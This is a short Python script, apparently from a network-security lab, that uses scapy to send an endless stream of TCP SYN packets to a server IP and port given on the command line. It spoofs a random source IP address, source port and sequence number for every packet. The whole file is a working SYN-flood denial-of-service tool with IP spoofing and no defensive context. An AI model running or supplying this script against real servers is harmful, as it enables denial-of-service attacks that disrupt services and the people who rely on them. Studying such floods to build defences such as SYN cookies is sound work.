#!/usr/bin/python3
# --------------------------------
import sys
from scapy.all import IP, TCP, send
from ipaddress import IPv4Address
from random import getrandbits
import time

if len(sys.argv) != 3:
  print("Usage: sys.argv[0] <IP of server> <port of server>")
  exit();

# program has all the 4 params
server_ip = sys.argv[1]
server_port = sys.argv[2]

ip = IP(dst=server_ip)
tcp = TCP(dport=int(server_port), flags='S')
pkt = ip/tcp

while True:
  pkt[IP].src=str(IPv4Address(getrandbits(32)))
  pkt[TCP].sport = getrandbits(16)
  pkt[TCP].seq = getrandbits(32)
  send(pkt, verbose = 0)
  time.sleep(1)

  
